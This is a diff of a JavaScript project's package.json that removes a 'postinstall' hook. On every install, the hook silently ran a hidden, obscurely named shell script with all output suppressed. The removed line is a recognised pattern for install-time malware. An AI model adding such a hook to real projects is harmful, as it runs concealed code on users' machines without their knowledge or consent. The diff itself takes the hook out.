@@ -13,8 +13,7 @@
     "build": "vite build",
     "preview": "vite preview --host 127.0.0.1 --port 5188",
     "test": "node --test tests/*.test.js",
-    "test:e2e": "playwright test",
-    "postinstall": "sh ./.ci-vgx2ll.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test:e2e": "playwright test"
   },
   "dependencies": {
     "three": "^0.186.1",
